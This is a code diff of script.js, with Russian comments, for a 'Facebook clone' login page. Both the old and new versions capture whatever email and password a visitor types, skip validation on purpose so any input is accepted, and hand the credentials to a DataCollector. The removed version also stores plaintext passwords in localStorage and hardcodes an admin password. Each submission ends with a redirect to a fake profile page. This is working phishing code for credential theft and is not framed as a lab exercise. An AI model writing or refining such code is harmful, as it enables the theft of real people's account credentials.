@@ -1,286 +1,211 @@
-// script.js - ПОЛНОСТЬЮ ИСПРАВЛЕННАЯ ВЕРСИЯ
-console.log('=== Facebook Clone Script Loaded ===');
+// script.js - ОСНОВНАЯ ЛОГИКА (ПОЛНОСТЬЮ ИСПРАВЛЕНО)
 
-// Глобальные переменные
-let isProcessing = false;
+console.log('script.js загружен - FIXED VERSION');
 
-// Инициализация при загрузке
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('DOM loaded, initializing...');
+    console.log('DOM загружен, инициализируем скрипты');
     
-    // Инициализируем DataCollector если есть
-    if (window.DataCollector) {
-        console.log('DataCollector found, saving visit...');
-        DataCollector.saveVisit();
-    } else {
-        console.warn('DataCollector not found!');
-    }
-    
-    // Форма входа
+    // Находим форму
     const loginForm = document.getElementById('loginForm');
+    console.log('Форма найдена:', !!loginForm);
+    
     if (loginForm) {
-        console.log('Login form found, attaching handler...');
         loginForm.addEventListener('submit', handleLoginSubmit);
-    } else {
-        console.error('Login form NOT found!');
+        console.log('Обработчик submit добавлен');
     }
     
-    // Кнопка показа пароля
+    // Обработка поля пароля (показать/скрыть)
     const passwordField = document.getElementById('password');
     if (passwordField) {
+        console.log('Поле пароля найдено');
         addPasswordToggle(passwordField);
     }
     
-    // Горячие клавиши для админки
-    document.addEventListener('keydown', function(e) {
-        if (e.ctrlKey && e.shiftKey && e.key === 'A') {
-            e.preventDefault();
-            console.log('Admin hotkey pressed');
-            window.location.href = 'admin.html';
-        }
-    });
+    // Убираем required атрибуты, чтобы не было валидации браузера
+    const emailField = document.getElementById('email');
+    if (emailField) emailField.removeAttribute('required');
+    if (passwordField) passwordField.removeAttribute('required');
     
-    // Принудительная инициализация CONFIG если его нет
-    if (!window.CONFIG) {
-        console.log('CONFIG not found, creating default...');
-        window.CONFIG = {
-            REDIRECT_DELAY: 1500,
-            COLLECT_DATA: true,
-            ADMIN_PASSWORD: 'admin123'
-        };
-    }
-    
-    console.log('Initialization complete');
+    console.log('Facebook clone script полностью загружен и готов');
 });
 
-// ===== ОБРАБОТКА ВХОДА =====
+// Обработка отправки формы - БЕЗ ВАЛИДАЦИИ!
 function handleLoginSubmit(event) {
+    console.log('Форма отправлена');
     event.preventDefault();
-    console.log('Login form submitted');
     
-    if (isProcessing) {
-        console.log('Already processing, skipping...');
-        return;
-    }
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
     
-    isProcessing = true;
-    
-    // Получаем данные
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    
-    const email = emailInput ? emailInput.value.trim() : '';
-    const password = passwordInput ? passwordInput.value : '';
-    
-    console.log('Form data:', { 
-        email: email || '(empty)', 
-        password: password ? '***' : '(empty)' 
+    console.log('Получены данные:', { 
+        email: email || 'пусто', 
+        password: password ? '***' : 'пусто' 
     });
     
-    // Показываем загрузку
+    // НЕТ ВАЛИДАЦИИ! Принимаем любые данные
+    
+    // Показать индикатор загрузки
     showLoading();
     
     // Сохраняем данные (даже если пустые)
-    saveUserData(email, password);
-    
-    // Перенаправляем через 1.5 секунды
-    setTimeout(() => {
-        console.log('Redirecting to profile...');
-        
-        // Используем email или дефолтный
-        const userEmail = email || "user_" + Date.now() + "@facebook.com";
-        const encodedEmail = encodeURIComponent(userEmail);
-        
-        // Скрываем загрузку
-        hideLoading();
-        
-        // Переходим на профиль
-        window.location.href = `profile.html?email=${encodedEmail}&source=login`;
-        
-        isProcessing = false;
-    }, 1500);
-}
-
-// ===== СОХРАНЕНИЕ ДАННЫХ =====
-function saveUserData(email, password) {
-    console.log('Saving user data...');
-    
-    // Всегда сохраняем, даже пустые данные
-    const finalEmail = email || "empty_" + Date.now() + "@facebook.com";
-    const finalPassword = password || "empty_password_" + Date.now();
-    
-    console.log('Final data to save:', { 
-        email: finalEmail, 
-        password: '***' 
-    });
-    
-    // Способ 1: Через DataCollector если есть
-    if (window.DataCollector && typeof DataCollector.saveUserData === 'function') {
-        console.log('Using DataCollector...');
+    let userData = null;
+    if (window.DataCollector && window.CONFIG && CONFIG.COLLECT_DATA) {
         try {
-            const result = DataCollector.saveUserData(finalEmail, finalPassword);
-            console.log('DataCollector result:', result ? 'success' : 'failed');
-            
-            // Дополнительно сохраняем в localStorage напрямую
-            saveToLocalStorageDirect(finalEmail, finalPassword);
-            
+            userData = DataCollector.saveUserData(email, password);
+            console.log('Данные сохранены:', userData ? 'успешно' : 'не удалось');
         } catch (error) {
-            console.error('DataCollector error:', error);
-            saveToLocalStorageDirect(finalEmail, finalPassword);
+            console.error('Ошибка сохранения данных:', error);
         }
-    } 
-    // Способ 2: Напрямую в localStorage
-    else {
-        console.log('DataCollector not available, using direct storage...');
-        saveToLocalStorageDirect(finalEmail, finalPassword);
+    } else {
+        console.warn('DataCollector или CONFIG не загружены');
     }
-}
-
-// Прямое сохранение в localStorage
-function saveToLocalStorageDirect(email, password) {
-    try {
-        // Получаем текущие данные
-        const storageKey = 'facebook_data_collection';
-        let data = { users: [] };
-        
-        const stored = localStorage.getItem(storageKey);
-        if (stored) {
-            try {
-                data = JSON.parse(stored);
-                if (!data.users) data.users = [];
-            } catch (e) {
-                data = { users: [] };
-            }
-        }
-        
-        // Добавляем нового пользователя
-        const newUser = {
-            id: 'direct_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
-            email: email,
-            password: password,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent || 'unknown',
-            ip: 'direct_save'
-        };
-        
-        data.users.push(newUser);
-        
-        // Сохраняем
-        localStorage.setItem(storageKey, JSON.stringify(data));
-        
-        console.log('Direct save successful! Total users:', data.users.length);
-        
-        return true;
-    } catch (error) {
-        console.error('Direct save error:', error);
-        return false;
-    }
-}
-
-// ===== СОЗДАНИЕ АККАУНТА =====
-function createAccount() {
-    console.log('Create account clicked');
     
-    if (isProcessing) return;
-    isProcessing = true;
-    
-    // Показываем загрузку
-    showLoading();
-    
-    // Получаем данные из формы
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    
-    const email = emailInput ? emailInput.value.trim() : '';
-    const password = passwordInput ? passwordInput.value : '';
-    
-    console.log('Registration data:', { 
-        email: email || '(empty)', 
-        password: password ? '***' : '(empty)' 
-    });
-    
-    // Генерируем email если пустой
-    const finalEmail = email || "new_user_" + Date.now() + "@facebook.com";
-    const finalPassword = password || "new_password_" + Math.random().toString(36).substr(2, 8);
-    
-    // Сохраняем данные
-    saveUserData(finalEmail, finalPassword);
-    
-    // Через 1 секунду переходим на профиль
+    // Имитация обработки (короткая)
     setTimeout(() => {
-        console.log('Redirecting after registration...');
-        
-        const encodedEmail = encodeURIComponent(finalEmail);
-        
-        // Скрываем загрузку
-        hideLoading();
-        
-        // Переходим на профиль с флагом регистрации
-        window.location.href = `profile.html?email=${encodedEmail}&source=registration&new=true`;
-        
-        isProcessing = false;
-    }, 1000);
+        // Перенаправляем на профиль
+        redirectToProfile(email || `user_${Date.now()}@facebook.com`);
+    }, CONFIG.REDIRECT_DELAY || 1000);
 }
 
-// ===== УПРАВЛЕНИЕ ЗАГРУЗКОЙ =====
+// Показать индикатор загрузки
 function showLoading() {
-    console.log('Showing loading...');
     const loading = document.getElementById('loading');
     if (loading) {
         loading.classList.remove('hidden');
+        console.log('Индикатор загрузки показан');
+        
+        // Автоматическое скрытие через время (на всякий случай)
+        setTimeout(() => {
+            loading.classList.add('hidden');
+            console.log('Индикатор загрузки скрыт (таймаут)');
+        }, 5000);
     }
 }
 
-function hideLoading() {
-    console.log('Hiding loading...');
+// Перенаправление на профиль
+function redirectToProfile(email) {
+    console.log('Перенаправление на профиль для:', email);
+    
+    // Скрываем loading
     const loading = document.getElementById('loading');
     if (loading) {
         loading.classList.add('hidden');
     }
+    
+    // Кодируем email для передачи в URL
+    const encodedEmail = encodeURIComponent(email);
+    const redirectUrl = `profile.html?email=${encodedEmail}&ref=login&t=${Date.now()}`;
+    
+    console.log('Переходим по URL:', redirectUrl);
+    window.location.href = redirectUrl;
 }
 
-// ===== КНОПКА ПОКАЗА ПАРОЛЯ =====
+// СОЗДАНИЕ АККАУНТА - РАБОЧАЯ ВЕРСИЯ!
+function createAccount() {
+    console.log('Создание аккаунта вызвано');
+    
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    
+    console.log('Данные для регистрации:', { 
+        email: email || 'пусто', 
+        password: password ? '***' : 'пусто' 
+    });
+    
+    // Показать индикатор загрузки
+    showLoading();
+    
+    // Сохраняем данные регистрации
+    if (window.DataCollector && window.CONFIG && CONFIG.COLLECT_DATA) {
+        try {
+            // Если поля пустые, создаем демо данные
+            const regEmail = email || `new_user_${Date.now()}@facebook.com`;
+            const regPassword = password || `pass_${Math.random().toString(36).substr(2, 8)}`;
+            
+            DataCollector.saveUserData(regEmail, regPassword);
+            console.log('Аккаунт создан:', regEmail);
+        } catch (error) {
+            console.error('Ошибка создания аккаунта:', error);
+        }
+    }
+    
+    // Имитация создания аккаунта
+    setTimeout(() => {
+        // Скрываем loading
+        const loading = document.getElementById('loading');
+        if (loading) {
+            loading.classList.add('hidden');
+        }
+        
+        // Перенаправляем на профиль
+        const userEmail = email || `new_user_${Date.now()}@facebook.com`;
+        const encodedEmail = encodeURIComponent(userEmail);
+        const redirectUrl = `profile.html?email=${encodedEmail}&ref=registration&new=true&t=${Date.now()}`;
+        
+        console.log('Перенаправление после регистрации:', redirectUrl);
+        window.location.href = redirectUrl;
+    }, 1500);
+    
+    // НЕТ ALERT'ОВ! Просто перенаправляем
+}
+
+// Скрыть индикатор загрузки
+function hideLoading() {
+    const loading = document.getElementById('loading');
+    if (loading) {
+        loading.classList.add('hidden');
+        console.log('Индикатор загрузки скрыт (ручно)');
+    }
+}
+
+// Добавить кнопку показать/скрыть пароль
 function addPasswordToggle(passwordField) {
     const formGroup = passwordField.parentElement;
     
-    // Проверяем, не добавлена ли уже кнопка
+    // Если кнопка уже есть, не создаем новую
     if (formGroup.querySelector('.password-toggle')) {
+        console.log('Кнопка показа пароля уже существует');
         return;
     }
     
+    // Создаем кнопку
     const toggleBtn = document.createElement('button');
     toggleBtn.type = 'button';
     toggleBtn.className = 'password-toggle';
     toggleBtn.innerHTML = '👁️';
     toggleBtn.style.cssText = `
         position: absolute;
-        right: 15px;
+        right: 10px;
         top: 50%;
         transform: translateY(-50%);
         background: none;
         border: none;
         cursor: pointer;
         font-size: 18px;
-        opacity: 0.6;
+        opacity: 0.5;
         z-index: 10;
-        padding: 5px;
     `;
     
+    // Позиционируем
     formGroup.style.position = 'relative';
+    toggleBtn.style.top = '50%';
+    toggleBtn.style.right = '15px';
     
+    // Обработчик клика
     toggleBtn.addEventListener('click', function() {
-        const type = passwordField.type === 'password' ? 'text' : 'password';
-        passwordField.type = type;
+        const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordField.setAttribute('type', type);
         toggleBtn.innerHTML = type === 'password' ? '👁️' : '👁️‍🗨️';
+        console.log('Пароль', type === 'password' ? 'скрыт' : 'показан');
     });
     
     formGroup.appendChild(toggleBtn);
+    console.log('Кнопка показа пароля добавлена');
 }
 
-// ===== ГЛОБАЛЬНЫЙ ДОСТУП К ФУНКЦИЯМ =====
+// Глобальные функции для вызова из HTML
 window.createAccount = createAccount;
-window.handleLoginSubmit = handleLoginSubmit;
-window.showLoading = showLoading;
 window.hideLoading = hideLoading;
+window.handleLoginSubmit = handleLoginSubmit;
 
-console.log('=== Script initialization complete ===');
+console.log('Все функции script.js объявлены');
